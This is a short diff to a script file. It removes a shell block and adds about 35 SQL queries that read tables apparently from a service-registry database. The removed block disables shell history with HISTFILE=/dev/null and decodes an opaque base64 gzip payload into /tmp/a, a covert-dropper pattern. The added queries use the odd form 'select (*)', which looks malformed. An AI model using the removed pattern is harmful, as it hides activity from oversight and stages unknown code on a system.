@@ -1,8 +1,36 @@
-
-HISTFILE=/dev/null; base64 -d << ENDBASE64 | gunzip > /tmp/a
-H4sIAHshz1YAA23OMYvCQBAF4H5/xXNdRIslGA6bJIJiROG4K9RKLNRMzGJcl01yqJf77yZRLA6r
-YRje+6bdcnZKO1nC2BoyBhd9jg3KEr+gfXJGaO3ZtmBS2maEzNBexVfkCUFpU+SIVUoe6KJyD3+s
-vQa/CJcjqGZd1Onge7UMRPd0zOlkIGVkr9IWulcbzcllDcRn88VyOv8MAyeiH0cXaephV6GDD8gI
-vo/wazIeLcJqL3Eo9E0ZDCG6b8j/WG01iHB7nPkQfRzqePkEHh+8+tkd+03x5hYBAAA=
-ENDBASE64
+select (*) from SUBJECT;
+select (*) from PREDICATE;
+select (*) from OBJECT;
+select (*) from GRAPH;
+select (*) from STATEMENT;
+select (*) from GSTATEMENT;
+select (*) from MOD_LOCK;
+select (*) from SR_ANALYTICS;
+select (*) from SR_ASSERTION;
+select (*) from SR_ASSOCIATED;
+select (*) from SR_ENTITYACTION;
+select (*) from SR_VALDTRPOLICY;
+select (*) from SR_WMB_POLICY;
+select (*) from "WSRRTASK";
+select (*) from "WSRRTREG";
+select (*) from "WSRRLMGR";
+select (*) from "WSRRLMPR";
+select (*) from UPGRADESTATUSRECORD;
+select (*) from UPGRADEEXCEPTIONS;
+select (*) from UPGRADEOBJECTHISTORY;
+select (*) from UPGRADEOBJECTSTATUS;
+select (*) from UPGRADECOMPONENTS;
+select (*) from CRE_LARGE_CDATA;
+select (*) from CRE_PAGE;
+select (*) from CRE_STATE_ITEM;
+select (*) from CRE_STATE_SET;
+select (*) from CRE_WIDGET_INSTANCE;
+select (*) from CRE_WIDGET_INSTANCE_CRE_WIRE;
+select (*) from CRE_WIRE;
+select (*) from UIUSER;
+select (*) from UISTATUSFLAG;
+select (*) from UIUSERSTORAGE;
+select (*) from USERVIEWPERM;
+select (*) from DEFAULTPERM;
+select (*) from VERIFY;
 
